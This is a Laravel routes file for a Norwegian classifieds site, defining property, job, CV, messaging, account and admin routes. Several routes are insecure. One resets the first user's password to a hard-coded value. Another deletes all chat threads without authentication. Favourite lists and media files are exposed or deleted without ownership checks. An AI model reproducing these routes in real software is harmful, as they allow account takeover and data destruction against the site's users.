<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

use App\Media;
use App\Models\Ad;
use App\Models\Meta;
use App\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Mail;
use Zizaco\Entrust\Entrust;
Auth::routes(['verify' => true]);
Route::get('clear-chat', function () {
    \App\MessageThread::where('id', '!=', 0)->delete();
    return redirect('messages');
});
Route::get('verify-registered', function (){
    return view('auth.verify_email');
});

Route::get('verified', function () {
    return view('auth.verified');
})->middleware('verified');
Route::get('{ad_type}/ad', 'HomeController@single_ad');
Route::get('mail', function () {
    $to_name = 'Zain';
    $to_email = 'zain@digitalmx.no';
    Mail::send('mail.new_user_verification', [], function ($message) use ($to_name, $to_email) {
        $message->to($to_email, $to_name)->subject('email subject');
        $message->from('developer@digitalmx.no', 'Developers of NorgesHandel');
    });
})->middleware('verified');

Route::group(['middleware' => 'authverified'], function () {

    Route::get('lang', 'TranslationController@index');

    Route::get('checksearch', 'SearchController@checksearch');
    Route::get('savedsearches', 'SearchController@index');
    Route::post('savedsearches/', 'SearchController@store');
    Route::post('recentearches/{value}/{name}/{ad_type}', 'SearchController@recent');

    Route::get('/residential/and/recreational/land/for/sale', function () {
        return view('user-panel.property.residential_and_recreational_land_for_sale');
    });

    Route::get('searching/{search?}', 'SearchController@search')->name('searching');
    Route::get('global-search/{search}', 'SearchController@global')->name('global');
    Route::get('job-searching/{search?}', 'SearchController@job_search')->name('job-searching');
    Route::get('job-search/{search}', 'SearchController@job_global')->name('job-global');
//    home routes
    Route::get('/home', 'HomeController@index')->name('home');

    Route::get('/notification', function () {

        return view('notification');
    });


    Route::get('/price-chart', function () {
        return view('user-panel.my-business.price_chart');
    });
    Route::get('/job-pref', function () {
        return view('user-panel.my-business.job_preferences');
    });

    Route::get('/privacy', function () {
        return view('user-panel.my-business.privacy_setting');
    });
    Route::get('/become-business', function () {
        return view('user-panel.footer.become_business');
    });
    Route::get('/customer-admin-for-business', function () {
        return view('user-panel.footer.customer_admin_for_business');
    });
    Route::get('/personvern', function () {

        return view('user-panel.footer.cookie');
    });
    Route::get('/rating', function () {
        return view('user-panel.my-business.rating');
    });

    Route::get('/customer-services', function () {
        return view('user-panel.footer.customer_service');
    });
    Route::get('/useful-info', function () {
        return view('user-panel.footer.useful_info');
    });

    Route::get('/cookie', function () {

        return view('user-panel.footer.cookie');
    });
    Route::get('/about-us', function () {
        return view('user-panel.footer.about_us');
    });

    /*
    Route::get('/account/old-summary', function () {
        return view('user-panel.my-business.profile.account_summary');
    });
    Route::get('/account', function () {
        return view('user-panel.my-business.profile.account');
    });
    */


//Compnies List

    Route::get('/companies', 'CompanyController@index');
    Route::get('/single-company/{id}', 'CompanyController@show');


//property search and filters
    Route::get('property/property-for-sale/search', 'Property\PropertyForSaleController@search_property_for_sale');
    Route::get('property/property-for-rent/search', 'Property\PropertyForRentController@search_property_for_rent');
    Route::get('property/commercial-property-for-sale/search', 'Property\CommercialPropertyForSaleController@search_commercial_property_for_sale');
    Route::get('property/commercial-property-for-rent/search', 'Property\CommercialPropertyForRentController@search_commercial_property_for_rent');
    Route::get('property/commercial-plots/search', 'Property\CommercialPlotController@search_commercial_plots');
    Route::get('property/holiday-homes-for-sale/search', 'Property\PropertyHolidaysHomesForSaleController@search_holiday_homes_for_sale');
    Route::get('property/business-for-sale/search', 'Property\BusinessForSaleController@search_business_for_sale');
    Route::get('property/flat-wishes-rented/search', 'Property\FlatWishesRentedController@search_flat_wishes_rented');


//Banner ads mangment
    Route::get('/admin/ads', 'Admin\ads\BannerController@index')->middleware(['role:admin|manager']);
    Route::get('/admin/ads/{id}/edit', 'Admin\ads\BannerController@edit')->middleware(['role:admin|manager']);
    Route::patch('/admin/ads/{id}/', 'Admin\ads\BannerController@update')->middleware(['role:admin|manager']);
    Route::delete('/admin/ads/{id}/', 'Admin\ads\BannerController@destroy')->middleware(['role:admin|manager']);
    Route::post('/admin/ads/', 'Admin\ads\BannerController@store')->middleware(['role:admin|manager']);
    Route::get('/admin/ads/create', 'Admin\ads\BannerController@create')->middleware(['role:admin|manager']);

    Route::post('/banner/ad/click', 'Admin\ads\BannerClickController@ad_clicked');

//Banner Group   /admin/banner-group/

// Route::resource('bannerGroup', 'Admin\ads\BannerGroupController');

    Route::get('/admin/banner-group/create', 'Admin\ads\BannerGroupController@create')->middleware(['role:admin|manager']);
    Route::post('/admin/banner-group/store', 'Admin\ads\BannerGroupController@store')
        ->middleware(['role:admin|manager'])->name('banner-group-new');
    Route::get('/admin/banner-group/index', 'Admin\ads\BannerGroupController@index')->middleware(['role:admin|manager']);
    Route::delete('/admin/banner-group/{id}', 'Admin\ads\BannerGroupController@destroy')->middleware(['role:admin|manager']);
    Route::get('/admin/banner-group/{id}/edit', 'Admin\ads\BannerGroupController@edit')->middleware(['role:admin|manager']);
    Route::patch('/admin/banner-group/{id}', 'Admin\ads\BannerGroupController@update')->middleware(['role:admin|manager']);


//language switch
    Route::get('my-business/cv/{locale}', function ($locale) {
        Session::put('locale', $locale);
        return redirect()->back();
    });


//    common routes for all users
    Route::get('jobs/search/', 'Admin\Jobs\JobController@search')->name('search');
    Route::get('jobs/search/filter_my_ads/{status}/{ad_type}', 'AdController@filter_my_ads');
    Route::post('jobs/store_dummy', 'Admin\Jobs\JobController@store_dummy')->name('store_dummy');
    Route::post('jobs/update_dummy', 'Admin\Jobs\JobController@update_dummy')->name('update_dummy');
    Route::get('jobs/mega_menu_search', 'Admin\Jobs\JobController@mega_menu_search')->name('mega_menu_search_url');

    Route::get('shared-lists/{link_id}', function ($link_id) {
        $list = \App\fav_list::where('share_link', $link_id)->get()->first();
        return view('user-panel.my-business.favorites.my_favorites_list', compact('list'));
    });

    Route::resources([
        'users' => 'Admin\Users\AdminUserController',
        'roles' => 'Admin\Users\RoleController',
        'jobs' => 'Admin\Jobs\JobController',

        'term' => 'TermController',
        'tax' => 'TaxonomyController',
        'media' => 'MediaController',
        'trans' => 'TranslationController'
    ]);
    Route::get('dummy', function () {
        return view('dummy');
    });
    Route::get('single', function () {
        return view('user-panel/jobs/single');
    });
    Route::get('logout', '\App\Http\Controllers\Auth\LoginController@logout')->name('logout');
    Route::get('forbidden', function () {
        return view('admin.users.forbidden');
    })->name('forbidden');
//--
    Route::get('us/{p}', function () {
        echo 'hello';
    });

//    routes for all non guest users
    Route::group(['middleware' => ['verified']], function () {
        Route::delete('property/delete/{obj}', 'PropertyController@property_destroy')->name('delete-property');
        Route::get('my-business/my-ads/{id}/options', 'AdController@ad_option');
        Route::get('my-business/my-ads/{id}/statistics', 'AdController@ad_statistics');
        Route::post('my-business/my-ads/{id}/sold', 'AdController@ad_sold')->name('ad-sold');
        // message
        Route::get('messages/thread/{thread_id}', 'MessageController@view_thread');
        Route::get('messages/delete/{thread_id}', 'MessageController@delete_thread');
        Route::get('messages/new/{ad_id}', 'MessageController@new_thread');
        Route::get('messages/render-thread/{thread_id}', 'MessageController@render_thread');
        Route::get('/messages', 'MessageController@index');

        Route::post('message', 'MessageController@send');
        Route::get('messages/read_all/{thread_id}', 'MessageController@read_all');

        Route::get('notifications', 'NotificationController@index');
        Route::get('notifications_count', 'NotificationController@notifications_count');
        Route::get('notifications-read-all', 'NotificationController@read_all');

//        Route::get('notifications/all', 'NotificationController@index');

//        Route::get('show/notifications/all', 'NotificationController@showAllNotifications');

        //Clear Searches
        Route::post('clear-searches', 'HomeController@clearSearches')->name('clear-searches');

//    Route::get('my-business', function () {return view('user-panel.my_business');})->name('my-business');

//    my business/min handel page routes
        Route::group(['prefix' => 'my-business'], function () {
            Route::get('savedsearches', 'SearchController@index');
            Route::resource('search', 'SearchController');

            Route::get('/', function () {
                return view('user-panel.my-business.my_business');
            });
            Route::get('my-ads/{status?}', 'AdController@my_ads');

//      favorites routes
            Route::get('favorites', 'FavoriteController@index');
            Route::get('get-favorites', 'FavoriteController@get_favorites');
            Route::get('add-list/{name}', 'FavoriteController@add_list')->name('add-list');
            Route::get('add-fav/{list_id}/{ad_id}', 'FavoriteController@add_fav');
            Route::get('remove-fav/{ad_id}', 'FavoriteController@remove_fav');
            Route::get('rename-list/{list_id}/{name}', 'FavoriteController@rename_list');
            Route::get('delete-list/{list_id}', 'FavoriteController@delete_list');
            Route::get('favorite-list/{list_id}', function ($list_id) {
                $list = \App\fav_list::where('id', $list_id)->get()->first();
                return view('user-panel.my-business.favorites.my_favorites_list', compact('list'));
            });
            Route::resource('cv', 'Cv\CvController');
            Route::group(['prefix' => 'cv'], function () {
                Route::resources([
                    'cvpersonal' => 'Cv\CvPersonalController',
                    'cvexperience' => 'Cv\CvExperienceController',
                    'cveducation' => 'Cv\CvEducationController'
                ]);
                Route::post('upload_cv_profile', 'Cv\CvController@upload_cv_profile')->name('upload_cv_profile');
//            Route::post('update_skills', 'Cv\CvController@update_skills')->name('update_skills');
                Route::post('update_skills/{cv_id}', 'Cv\CvController@update_skills')->name('update_skills');
                Route::post('update_languages/{cv_id}', 'Cv\CvController@update_languages')->name('update_languages');
                Route::post('update_preference/{cv_id}', 'Cv\CvController@update_preference')->name('update_preference');
                Route::get('download_pdf/{cv_id}', 'Cv\CvController@download_pdf')->name('download_pdf');
            });
            Route::get('profile', 'Admin\Users\AdminUserController@profile')->name('profile');
            Route::post('profile/request_company_profile', 'Admin\Users\AdminUserController@request_company_profile')->name('request_company_profile');
            Route::get('profile/select_company_profile_type', function () {
                return view('user-panel.footer.become_business');
//                return view('user-panel.my-business.profile.company_request_1');
            });
            Route::get('profile/company_profile_form/{type}', function ($type) {
                return view('user-panel.my-business.profile.company_request_2', compact('type'));
            });
            Route::resource('company', 'CompanyController');
            Route::get('cv/extend', 'Cv\CvController@extend');
            Route::resource('job-preferences', 'JobPreferenceController');
            Route::resource('following', 'FollowingController');
        });

//    new ad routes
        Route::group(['prefix' => 'new'], function () {
            Route::get('/', function () {
                return view('user-panel.select-ad-category');
            });

//        new job routes
            Route::group(['prefix' => 'job'], function () {
                Route::get('full_time', function () {
                    return view('user-panel.jobs.new_full_time');
                });
                Route::get('part_time', function () {
                    return view('user-panel.jobs.new_part_time');
                });
                Route::get('management', function () {
                    return view('user-panel.jobs.new_management');
                });
            });

            Route::group(['prefix' => 'property'], function () {
                Route::get('property-for-sale', 'Property\PropertyForSaleController@new_property_for_sale');
                Route::get('property-for-rent', 'Property\PropertyForRentController@new_property_for_rent');
               Route::get('property-for-flat-wishes-rented', 'Property\FlatWishesRentedController@new_property_for_flat_wishes_rented');
               Route::get('property-for-holiday-homes-for-sale', 'Property\PropertyHolidaysHomesForSaleController@new_property_for_holiday_homes_for_sale');
                 Route::get('commercial-property-for-sale', 'Property\CommercialPropertyForSaleController@new_commercial_property_for_sale');
                 Route::get('commercial-property-for-rent', 'Property\CommercialPropertyForRentController@new_commercial_property_for_rent');
                 Route::get('business-for-sale', 'Property\BusinessForSaleController@new_business_for_sale');
                 Route::get('commercial-plots', 'Property\CommercialPlotController@new_commercial_plots');
            });
        });
        Route::group(['prefix' => 'complete'], function () {
            Route::get('ad/{id}', 'PropertyController@complete_property');
        });

        Route::get('profile/public/{id}', 'Admin\Users\AdminUserController@public_profile')->name('public_profile');

        // User account settings and notification settings

        Route::get('/setting', function () {
            return view('user-panel.my-business.settings');
        });
        Route::post('store-notifications-setting','Admin\Users\AdminUserController@store_notifications_setting')->name('store_notifications_setting');


        //Account Setting Login
//        Route::post('account-setting-login', 'AccountSettingController@login')->name('account-setting-login');
//        Route::get('/account/login', function () {
//            return view('user-panel.my-business.profile.account-setting-login');
//        });

        ///Account setting pages and routes
        Route::group(['prefix'=>'account'], function () {
            Route::get('/products', function () {
                return view('user-panel.my-business.profile.account-products');
            });

            Route::get('/purchasehistory', function () {
                return view('user-panel.my-business.profile.account-purchase-history');
            });

            Route::get('/privacy', function () {
                return view('user-panel.my-business.profile.account-privacy');
            });
            Route::get('/summary', function () {
                return view('user-panel.my-business.profile.account-summary');
            });
            Route::get('/redeem', function () {
                return view('user-panel.my-business.profile.account-redeem');
            });
            Route::get('/setting', function () {
                $user = Auth::user();
                return view('user-panel.my-business.profile.account_setting', compact('user'));
            });
            Route::get('/chnagepassword', function () {
                return view('user-panel.my-business.profile.account-change-password');
            });

            Route::get('/emails', function () {
                return view('user-panel.my-business.profile.account-emails');
            });

            //Send verification email to account setting alternative email
            Route::get('/verifyemail', function (Request $request) {

                if ($request && $request->email) {
                    $is_auth_user_email = Meta::where('key', 'account_setting_alt_email')->where('value', $request->email)->where('metable_type', 'App\User')->where('metable_id', Auth::id())->first();
                    if ($is_auth_user_email) {
                        //Store verify email record in meta table against user account setting emails
                        if ($request->email_verified) {
                            $is_email_verified = Meta::where('key', 'account_setting_alt_email_verified')->where('value', $request->email)->where('metable_type', 'App\User')->where('metable_id', Auth::id())->first();
                            if (!$is_email_verified) {
                                Meta::create([
                                    'metable_id' => Auth::id(),
                                    'metable_type' => 'App\User',
                                    'key' => 'account_setting_alt_email_verified',
                                    'value' => $request->email,
                                ]);
                                //redirect to account email after verification of an email
                                session()->flash('success', 'Din e-post er nå verifisert.');
                                return redirect(url('/account/emails'));
                            } else {
                                session()->flash('success', 'E-postadressen din er allerede bekreftet.');
                                return redirect(url('/account/emails'));
                            }
                        }

                        //Send email to verify
                        $to_email = $request->email;//$user->email;
                        $user = Auth::user();
                        Mail::send('mail.verify_user_account_setting_email', compact('user', 'to_email'), function ($message) use ($to_email) {
                            $message->to($to_email)->subject('Bekreft din e-postadresse');
                            $message->from('developer@digitalmx.no', 'NorgesHandel ');
                        });
                    }
                }

                //Open verify account email view
                return view('user-panel.my-business.profile.verify-account-email');
            });

            //Delete account setting alternative email
            Route::get('/deleteemail', function (Request $request) {
                if ($request->email && $request->delete_email == 'yes') {
                    $email = Meta::where('key', 'account_setting_alt_email')->where('value', $request->email)->where('metable_type', 'App\User')->where('metable_id', Auth::id())->first();
                    if ($email) {
                        $is_email_verified = Meta::where('metable_id', $email->metable_id)->where('metable_type', $email->metable_type)
                            ->where('key', 'account_setting_alt_email_verified')->where('value', $email->value)->first();
                        if ($is_email_verified) {
                            $is_email_verified->delete();
                        }
                        $email->delete();
                        session()->flash('success', $request->email . ' ble slettet fra din profil.');
                        return redirect(url('/account/emails'));
                    } else {
                        return back();
                    }
                }
                return view('user-panel.my-business.profile.delete-account-email');
            });

            Route::get('/deletephone', function (Request $request) {
                if( $request->phone && $request->delete_phone == 'yes'){
                    $contact_no = Meta::where('key','account_setting_alt_contact_no')->where('value','+'.$request->phone)->where('metable_type','App\User')->where('metable_id',Auth::id())->first();
                    if($contact_no){
                        session()->flash('success', '+'.$request->phone.' ble slettet fra din profil.');
                        $contact_no->delete();
                        session()->flash('success', '+'.$request->phone.' ble slettet fra din profil.');
                        return redirect('/account/phones');
                    }else{
                        return back();
                    }
                }
                return view('user-panel.my-business.profile.delete-account-contact-no');
            });

            Route::get('/phones', function () {
                return view('user-panel.my-business.profile.account-phone');
            });
        });

        Route::post('store-user-emails', 'Admin\Users\AdminUserController@store_user_alternative_email')->name('store-user-emails');
        Route::post('store-user-contact-no', 'Admin\Users\AdminUserController@store_user_alternative_contact_no')->name('store-user-contact-no');




    });

    Route::group(['prefix' => 'admin', 'as' => 'admin.', 'middleware' => ['role:admin|manager']], function () {

//    dashboard
        Route::get('/', 'Admin\DashboardController@index')->name('dashboard');
//    job custom routes
        Route::get('/jobs/select_category', function () {
            return view('admin.jobs.jobs_select_category');
        });
        Route::get('/jobs/create/{type}', 'Admin\Jobs\JobController@create')->name('jobs.create');
        Route::get('/jobs/status_change/{ad}/status/{status}', 'Admin\Jobs\JobController@status_change')->name('jobs.status_change');
//    edit user role
        Route::post('/roles/edit_role', 'Admin\Users\RoleController@edit_role')->name('roles.edit_role');
//    route to change user role
        Route::POST('/users/change_role', 'Admin\Users\AdminUserController@change_role')->name('users.change_role');
//    all general resources
        Route::resources([
            'dashboard' => 'Admin\DashboardController',
            'users' => 'Admin\Users\AdminUserController',
            'roles' => 'Admin\Users\RoleController',
            'jobs' => 'Admin\Jobs\JobController',

            'term' => 'TermController',
            'tax' => 'TaxonomyController',
            'media' => 'MediaController',
        ]);
    });

    Route::get('reset', function () {
        \App\User::all()->first()->update(['password' => \Illuminate\Support\Facades\Hash::make('gujrat786')]);

    });

//  zille bellow
    Route::get('property/realestate', 'PropertyController@list');
    Route::get('new/property/rent/ad/{id}/edit', 'Property\PropertyForRentController@newAddedit');
    Route::patch('add/property/for/rent/ad/{id}', 'Property\PropertyForRentController@UpdatePropertyForRentAdd');
    Route::patch('add/property/for/rent/ad/update/{id}', 'Property\PropertyForRentController@UpdateDummyRentAdd');
    Route::get('new/property/sale/ad/{id}/edit', 'Property\PropertyForSaleController@editSaleAdd');
    Route::patch('new/property/sale/ad/{id}', 'Property\PropertyForSaleController@updateSaleAdd');
    Route::patch('new/property/sale/ad/update/{id}', 'Property\PropertyForSaleController@UpdateDummySaleAdd');

//Holiday home for sale
    Route::get('holiday/home/for/sale/{id}/edit', 'Property\PropertyHolidaysHomesForSaleController@editHolidayHomeForSale');
    Route::patch('holiday/home/for/sale/{id}', 'Property\PropertyHolidaysHomesForSaleController@updateHomeForSaleAd');
    Route::patch('holiday/home/for/sale/update/{id}', 'Property\PropertyHolidaysHomesForSaleController@updateDummyHomeForSaleAd');

    Route::get('new/flat/wishes/rented/{id}/edit', 'Property\FlatWishesRentedController@editAddFlatWishesRented');
    Route::patch('new/flat/wishes/rented/{id}', 'Property\FlatWishesRentedController@updateFlatWishesRented');
    Route::patch('new/flat/wishes/rented/update/{id}', 'Property\FlatWishesRentedController@updateDummyFlatWishesRented');
    Route::get('add/new/commercial/property/for/sale/{id}/edit', 'Property\CommercialPropertyForSaleController@editCommercialPropertyForSale');
    Route::patch('add/new/commercial/property/for/sale/{id}', 'Property\CommercialPropertyForSaleController@updateCommercialPropertyForSale');
    Route::patch('add/new/commercial/property/for/sale/update/{id}', 'Property\CommercialPropertyForSaleController@updateDummyCommercialPropertyForSale');
//    Route::get('/property/description/{id}', ['uses' => 'Property\PropertyForRentController@propertyDescription']);
//    Route::get('/property/for/sale/description/{id}', ['uses' => 'Property\PropertyForSaleController@propertyForSaleDescription']);


    /// Upload images using dropzone
    Route::post('upload-images', 'PropertyController@upload_dropzone_images')->name('upload-images'); // upload images on add form request
    Route::patch('update-upload-images', 'PropertyController@upload_dropzone_images'); // upload images on edit form request

    //flatwishesrented
//    Route::get('/flat/wishes/rented/description/{id}', ['uses' => 'Property\FlatWishesRentedController@flatWishesRentedDescription']);

    //holidayhomeforsale
//    Route::get('/holiday/home/for/sale/description/{id}', ['uses' => 'Property\PropertyHolidaysHomesForSaleController@holidayHomeForSaleDescription']);

    //Property\CommercialPropertyForSale
//    Route::get('/commercial/property/for/sale/description/{id}', ['uses' => 'Property\CommercialPropertyForSaleController@commercialForSaleDescription']);

    //commercial property for rent
    Route::get('add/new/commercial/property/for/rent/{id}/edit', 'Property\CommercialPropertyForRentController@editCommercialPropertyForRent');
    Route::patch('add/new/commercial/property/for/rent/{id}', 'Property\CommercialPropertyForRentController@updateCommercialPropertyForRent');
    Route::patch('add/new/commercial/property/for/rent/update/{id}', 'Property\CommercialPropertyForRentController@updateDummyCommercialPropertyForRent');

//    Route::get('/commercial/property/for/rent/description/{id}', 'Property\CommercialPropertyForRentController@commercialForRentDescription');

    // Business for sale
    Route::post('add/business/for/sale/{id}/edit', 'Property\BusinessForSaleController@editBusinessForSale');
    Route::patch('add/business/for/sale/{id}', 'Property\BusinessForSaleController@updateBusinessForSale');
    Route::patch('add/business/for/sale/update/{id}', 'Property\BusinessForSaleController@updateDummyBusinessForSale');
    Route::get('add/business/for/sale/{id}/edit', 'Property\BusinessForSaleController@editBusinessForSale');
    Route::patch('add/business/for/sale/{id}', 'Property\BusinessForSaleController@updateBusinessForSale');
//    Route::get('/business/for/sale/description/{id}', 'Property\BusinessForSaleController@businessForSaleDescription');

    //Commercial Plots
    Route::get('/commercial/plots/{id}/edit', 'Property\CommercialPlotController@editCommercialPlots');
    Route::patch('commercial/plots/{id}', 'Property\CommercialPlotController@updateCommercialPlots');
    Route::patch('commercial/plots/update/{id}', 'Property\CommercialPlotController@updateDummyCommercialPlots');
//    Route::get('/commercial/plots/ads/description/{id}', 'Property\CommercialPlotController@commercialPlotDescription');
//    Route::get('general/property/description/{id}/{type}', 'PropertyController@generalPropertyDescription');

    Route::get('test', function () {
        event(new App\Events\PropertyForRent('Guest'));
        return "Event has been sent!";
    });


    Route::get('/delete-media-dz', function () {
        $media = Media::where('name_unique', $_GET['filename'])->first();
        if ($media) {
            $path = 'public/uploads/' . date('Y', strtotime($media->updated_at)) . '/' . date('m', strtotime($media->updated_at)) . '/';
            $arr = explode('.', $media->name_unique);

            foreach (glob($path . $arr[0] . '*.*') as $file) {
                unlink($file);
            }
            $media->delete();
        }
        $response = array();
        $response['flag'] = 'success';
        return json_encode($response);
    });
    Route::post('/update-media-positions', function (Request $request) {
        $response = array();
        $response['flag'] = 'failure';
        if (isset($request->dataArr)) {
            $data = json_decode($request->dataArr);
            foreach ($data as $data_arr) {
                $response['flag'] = 'success';
                $media = Media::where('name_unique', $data_arr[0])->first();
                if ($media) {
                    $media->order = $data_arr[1];
                    $media->save();
                }
            }
        }
        return json_encode($response);
    });

    Route::post('search/notification/exists', 'NotificationController@searchNotificationExists');
    Route::get('/{handel?}', 'HomeController@index');
});
